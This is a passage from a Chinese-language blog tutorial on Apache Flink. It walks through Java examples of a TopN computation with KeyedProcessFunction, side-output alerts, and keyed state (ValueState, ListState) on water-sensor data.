class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KeyedProcessFunctionTopNDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction())</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;WaterSensor&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>))</span><br><span class="line">                                .withTimestampAssigner((element, ts) -&gt; element.getTs() * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 最近10秒= 窗口长度， 每5秒输出 = 滑动步长</span></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * TODO 思路二： 使用 KeyedProcessFunction实现</span></span><br><span class="line"><span class="comment">         * 1、按照vc做keyby，开窗，分别count</span></span><br><span class="line"><span class="comment">         *    ==》 增量聚合，计算 count</span></span><br><span class="line"><span class="comment">         *    ==》 全窗口，对计算结果 count值封装 ，  带上 窗口结束时间的 标签</span></span><br><span class="line"><span class="comment">         *          ==》 为了让同一个窗口时间范围的计算结果到一起去</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * 2、对同一个窗口范围的count值进行处理： 排序、取前N个</span></span><br><span class="line"><span class="comment">         *    =》 按照 windowEnd做keyby</span></span><br><span class="line"><span class="comment">         *    =》 使用process， 来一条调用一次，需要先存，分开存，用HashMap,key=windowEnd,value=List</span></span><br><span class="line"><span class="comment">         *      =》 使用定时器，对 存起来的结果 进行 排序、取前N个</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 按照 vc 分组、开窗、聚合（增量计算+全量打标签）</span></span><br><span class="line">        <span class="comment">//  开窗聚合后，就是普通的流，没有了窗口信息，需要自己打上窗口的标记 windowEnd</span></span><br><span class="line">        SingleOutputStreamOperator&lt;Tuple3&lt;Integer, Integer, Long&gt;&gt; windowAgg = sensorDS.keyBy(sensor -&gt; sensor.getVc())</span><br><span class="line">                .window(SlidingEventTimeWindows.of(Time.seconds(<span class="number">10</span>), Time.seconds(<span class="number">5</span>)))</span><br><span class="line">                .aggregate(</span><br><span class="line">                        <span class="keyword">new</span> VcCountAgg(),</span><br><span class="line">                        <span class="keyword">new</span> WindowResult()</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 按照窗口标签（窗口结束时间）keyby，保证同一个窗口时间范围的结果，到一起去。排序、取TopN</span></span><br><span class="line">        windowAgg.keyBy(r -&gt; r.f2)</span><br><span class="line">                .process(<span class="keyword">new</span> TopN(<span class="number">2</span>))</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">VcCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">WaterSensor</span>, <span class="title">Integer</span>, <span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">add</span><span class="params">(WaterSensor value, Integer accumulator)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">getResult</span><span class="params">(Integer accumulator)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> accumulator;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">merge</span><span class="params">(Integer a, Integer b)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 泛型如下：</span></span><br><span class="line"><span class="comment">     * 第一个：输入类型 = 增量函数的输出  count值，Integer</span></span><br><span class="line"><span class="comment">     * 第二个：输出类型 = Tuple3(vc，count，windowEnd) ,带上 窗口结束时间 的标签</span></span><br><span class="line"><span class="comment">     * 第三个：key类型 ， vc，Integer</span></span><br><span class="line"><span class="comment">     * 第四个：窗口类型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowResult</span> <span class="keyword">extends</span> <span class="title">ProcessWindowFunction</span>&lt;<span class="title">Integer</span>, <span class="title">Tuple3</span>&lt;<span class="title">Integer</span>, <span class="title">Integer</span>, <span class="title">Long</span>&gt;, <span class="title">Integer</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(Integer key, Context context, Iterable&lt;Integer&gt; elements, Collector&lt;Tuple3&lt;Integer, Integer, Long&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// 迭代器里面只有一条数据，next一次即可</span></span><br><span class="line">            Integer count = elements.iterator().next();</span><br><span class="line">            <span class="keyword">long</span> windowEnd = context.window().getEnd();</span><br><span class="line">            out.collect(Tuple3.of(key, count, windowEnd));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TopN</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">Tuple3</span>&lt;<span class="title">Integer</span>, <span class="title">Integer</span>, <span class="title">Long</span>&gt;, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">        <span class="comment">// 存不同窗口的 统计结果，key=windowEnd，value=list数据</span></span><br><span class="line">        <span class="keyword">private</span> Map&lt;Long, List&lt;Tuple3&lt;Integer, Integer, Long&gt;&gt;&gt; dataListMap;</span><br><span class="line">        <span class="comment">// 要取的Top数量</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> threshold;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TopN</span><span class="params">(<span class="keyword">int</span> threshold)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.threshold = threshold;</span><br><span class="line">            dataListMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(Tuple3&lt;Integer, Integer, Long&gt; value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// 进入这个方法，只是一条数据，要排序，得到齐才行 ===》 存起来，不同窗口分开存</span></span><br><span class="line">            <span class="comment">// 1. 存到HashMap中</span></span><br><span class="line">            Long windowEnd = value.f2;</span><br><span class="line">            <span class="keyword">if</span> (dataListMap.containsKey(windowEnd)) &#123;</span><br><span class="line">                <span class="comment">// 1.1 包含vc，不是该vc的第一条，直接添加到List中</span></span><br><span class="line">                List&lt;Tuple3&lt;Integer, Integer, Long&gt;&gt; dataList = dataListMap.get(windowEnd);</span><br><span class="line">                dataList.add(value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 1.1 不包含vc，是该vc的第一条，需要初始化list</span></span><br><span class="line">                List&lt;Tuple3&lt;Integer, Integer, Long&gt;&gt; dataList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                dataList.add(value);</span><br><span class="line">                dataListMap.put(windowEnd, dataList);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2. 注册一个定时器， windowEnd+1ms即可（</span></span><br><span class="line">            <span class="comment">// 同一个窗口范围，应该同时输出，只不过是一条一条调用processElement方法，只需要延迟1ms即可</span></span><br><span class="line">            ctx.timerService().registerEventTimeTimer(windowEnd + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>.onTimer(timestamp, ctx, out);</span><br><span class="line">            <span class="comment">// 定时器触发，同一个窗口范围的计算结果攒齐了，开始 排序、取TopN</span></span><br><span class="line">            Long windowEnd = ctx.getCurrentKey();</span><br><span class="line">            <span class="comment">// 1. 排序</span></span><br><span class="line">            List&lt;Tuple3&lt;Integer, Integer, Long&gt;&gt; dataList = dataListMap.get(windowEnd);</span><br><span class="line">            dataList.sort(<span class="keyword">new</span> Comparator&lt;Tuple3&lt;Integer, Integer, Long&gt;&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Tuple3&lt;Integer, Integer, Long&gt; o1, Tuple3&lt;Integer, Integer, Long&gt; o2)</span> </span>&#123;</span><br><span class="line">                    <span class="comment">// 降序， 后 减 前</span></span><br><span class="line">                    <span class="keyword">return</span> o2.f1 - o1.f1;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2. 取TopN</span></span><br><span class="line">            StringBuilder outStr = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">            outStr.append(<span class="string">"================================\n"</span>);</span><br><span class="line">            <span class="comment">// 遍历 排序后的 List，取出前 threshold 个， 考虑可能List不够2个的情况  ==》 List中元素的个数 和 2 取最小值</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Math.min(threshold, dataList.size()); i++) &#123;</span><br><span class="line">                Tuple3&lt;Integer, Integer, Long&gt; vcCount = dataList.get(i);</span><br><span class="line">                outStr.append(<span class="string">"Top"</span> + (i + <span class="number">1</span>) + <span class="string">"\n"</span>);</span><br><span class="line">                outStr.append(<span class="string">"vc="</span> + vcCount.f0 + <span class="string">"\n"</span>);</span><br><span class="line">                outStr.append(<span class="string">"count="</span> + vcCount.f1 + <span class="string">"\n"</span>);</span><br><span class="line">                outStr.append(<span class="string">"窗口结束时间="</span> + vcCount.f2 + <span class="string">"\n"</span>);</span><br><span class="line">                outStr.append(<span class="string">"================================\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 用完的List，及时清理，节省资源</span></span><br><span class="line">            dataList.clear();</span><br><span class="line"></span><br><span class="line">            out.collect(outStr.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5、侧输出流（Side-Output）">5、侧输出流（Side Output）</h2><p>侧输出流可以认为是“主流”上分叉出的“支流”，所以可以由一条流产生出多条流，而且这些流中的数据类型还可以不一样。利用这个功能可以很容易地实现“分流”操作。具体应用时，只要在处理函数的.processElement()或者.onTimer()方法中，调用上下文的.output()方法就可以了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Integer&gt; stream = env.fromSource(...);</span><br><span class="line"></span><br><span class="line">OutputTag&lt;String&gt; outputTag = <span class="keyword">new</span> OutputTag&lt;String&gt;(<span class="string">"side-output"</span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">SingleOutputStreamOperator&lt;Long&gt; longStream = stream.process(<span class="keyword">new</span> ProcessFunction&lt;Integer, Long&gt;() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">( Integer value, Context ctx, Collector&lt;Integer&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 转换成Long，输出到主流中</span></span><br><span class="line">      out.collect(Long.valueOf(value));</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 转换成String，输出到侧输出流中</span></span><br><span class="line">      ctx.output(outputTag, <span class="string">"side-output: "</span> + String.valueOf(value));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 这里output()方法需要传入两个参数，第一个是一个“输出标签”OutputTag，用来标识侧输出流，一般会在外部统一声明；第二个就是要输出的数据。</span></span><br></pre></td></tr></table></figure><p>举例对每个传感器，水位超过10的输出告警信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SideOutputDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction())</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;WaterSensor&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>))</span><br><span class="line">                                .withTimestampAssigner((element, ts) -&gt; element.getTs() * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        OutputTag&lt;String&gt; warnTag = <span class="keyword">new</span> OutputTag&lt;&gt;(<span class="string">"warn"</span>, Types.STRING);</span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; process = sensorDS.keyBy(sensor -&gt; sensor.getId())</span><br><span class="line">                .process(</span><br><span class="line">                        <span class="keyword">new</span> KeyedProcessFunction&lt;String, WaterSensor, WaterSensor&gt;() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(WaterSensor value, Context ctx, Collector&lt;WaterSensor&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="comment">// 使用侧输出流告警</span></span><br><span class="line">                                <span class="keyword">if</span> (value.getVc() &gt; <span class="number">10</span>) &#123;</span><br><span class="line">                                    ctx.output(warnTag, <span class="string">"当前水位="</span> + value.getVc() + <span class="string">",大于阈值10！！！"</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="comment">// 主流正常 发送数据</span></span><br><span class="line">                                out.collect(value);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        process.print(<span class="string">"主流"</span>);</span><br><span class="line">        process.getSideOutput(warnTag).printToErr(<span class="string">"warn"</span>);</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>七、状态管理</h1><h2 id="1、Flink中的状态">1、Flink中的状态</h2><h3 id="1-1-概述">1.1 概述</h3><p><img src="http://qnypic.shawncoding.top/blog/202404161646762.png" alt></p><h3 id="1-2-状态的分类">1.2 状态的分类</h3><ul><li><strong>托管状态（Managed State）和原始状态（Raw State）</strong></li></ul><p>Flink的状态有两种：托管状态（Managed State）和原始状态（Raw State）。托管状态就是由Flink统一管理的，状态的存储访问、故障恢复和重组等一系列问题都由Flink实现，我们只要调接口就可以；而原始状态则是自定义的，相当于就是开辟了一块内存，需要我们自己管理，实现状态的序列化和故障恢复。<strong>通常我们采用Flink托管状态来实现需求</strong></p><ul><li><strong>算子状态（Operator State）和按键分区状态（Keyed State）</strong></li></ul><p>托管状态分为两类：算子状态和按键分区状态</p><p><img src="http://qnypic.shawncoding.top/blog/202404161646763.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202404161646764.png" alt></p><p>另外，也可以通过**富函数类（Rich Function）**来自定义Keyed State，所以只要提供了富函数类接口的算子，也都可以使用Keyed State。所以即使是map、filter这样无状态的基本转换算子，我们也可以通过富函数类给它们“追加”Keyed State。比如RichMapFunction、RichFilterFunction。在富函数中，我们可以调用.getRuntimeContext()获取当前的运行时上下文（RuntimeContext），进而获取到访问状态的句柄；这种富函数中自定义的状态也是Keyed State。从这个角度讲，<strong>Flink中所有的算子都可以是有状态的</strong>。</p><p>无论是Keyed State还是Operator State，它们都是在本地实例上维护的，也就是说<strong>每个并行子任务维护着对应的状态，算子的子任务之间状态不共享</strong></p><h2 id="2、按键分区状态（Keyed-State）">2、按键分区状态（Keyed State）</h2><p>使用Keyed State必须基于KeyedStream。没有进行keyBy分区的DataStream，即使转换算子实现了对应的富函数类，也不能通过运行时上下文访问Keyed State</p><h3 id="2-1-值状态（ValueState）">2.1 值状态（ValueState）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ValueState</span>&lt;<span class="title">T</span>&gt; <span class="keyword">extends</span> <span class="title">State</span> </span>&#123;</span><br><span class="line">    <span class="function">T <span class="title">value</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(T value)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这里的T是泛型，表示状态的数据内容可以是任何具体的数据类型。如果想要保存一个长整型值作为状态，那么类型就是ValueState&lt;Long&gt;</span></span><br><span class="line"><span class="comment">// T value()：获取当前状态的值；</span></span><br><span class="line"><span class="comment">// update(T value)：对状态进行更新，传入的参数value就是要覆写的状态值</span></span><br></pre></td></tr></table></figure><p>**案例需求：**检测每种传感器的水位值，如果连续的两个水位值超过10，就输出报警</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KeyedValueStateDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction())</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;WaterSensor&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>))</span><br><span class="line">                                .withTimestampAssigner((element, ts) -&gt; element.getTs() * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        sensorDS.keyBy(r -&gt; r.getId())</span><br><span class="line">                .process(</span><br><span class="line">                        <span class="keyword">new</span> KeyedProcessFunction&lt;String, WaterSensor, String&gt;() &#123;</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// TODO 1.定义状态</span></span><br><span class="line">                            ValueState&lt;Integer&gt; lastVcState;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="keyword">super</span>.open(parameters);</span><br><span class="line">                                <span class="comment">// TODO 2.在open方法中，初始化状态</span></span><br><span class="line">                                <span class="comment">// 状态描述器两个参数：第一个参数，起个名字，不重复；第二个参数，存储的类型</span></span><br><span class="line">                                lastVcState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Integer&gt;(<span class="string">"lastVcState"</span>, Types.INT));</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(WaterSensor value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//                                lastVcState.value();  // 取出 本组 值状态 的数据</span></span><br><span class="line"><span class="comment">//                                lastVcState.update(); // 更新 本组 值状态 的数据</span></span><br><span class="line"><span class="comment">//                                lastVcState.clear();  // 清除 本组 值状态 的数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                <span class="comment">// 1. 取出上一条数据的水位值(Integer默认值是null，判断)</span></span><br><span class="line">                                <span class="keyword">int</span> lastVc = lastVcState.value() == <span class="keyword">null</span> ? <span class="number">0</span> : lastVcState.value();</span><br><span class="line">                                <span class="comment">// 2. 求差值的绝对值，判断是否超过10</span></span><br><span class="line">                                Integer vc = value.getVc();</span><br><span class="line">                                <span class="keyword">if</span> (Math.abs(vc - lastVc) &gt; <span class="number">10</span>) &#123;</span><br><span class="line">                                    out.collect(<span class="string">"传感器="</span> + value.getId() + <span class="string">"==&gt;当前水位值="</span> + vc + <span class="string">",与上一条水位值="</span> + lastVc + <span class="string">",相差超过10！！！！"</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="comment">// 3. 更新状态里的水位值</span></span><br><span class="line">                                lastVcState.update(vc);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                )</span><br><span class="line">                .print();</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-列表状态（ListState）">2.2 列表状态（ListState）</h3><p>将需要保存的数据，以列表（List）的形式组织起来。在ListState&lt;T&gt;接口中同样有一个类型参数T，表示列表中数据的类型。ListState也提供了一系列的方法来操作状态，使用方式与一般的List非常相似</p><ul><li>Iterable&lt;T&gt; get()：获取当前的列表状态，返回的是一个可迭代类型Iterable&lt;T&gt;；</li><li>update(List&lt;T&gt; values)：传入一个列表values，直接对状态进行覆盖；</li><li>add(T value)：在状态列表中添加一个元素value；</li><li>addAll(List&lt;T&gt; values)：向列表中添加多个元素，以列表values形式传入。</li></ul><p>类似地，ListState的状态描述器就叫作ListStateDescriptor，用法跟ValueStateDescriptor完全一致</p><p><strong>案例</strong>:针对每种传感器输出最高的3个水位值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td 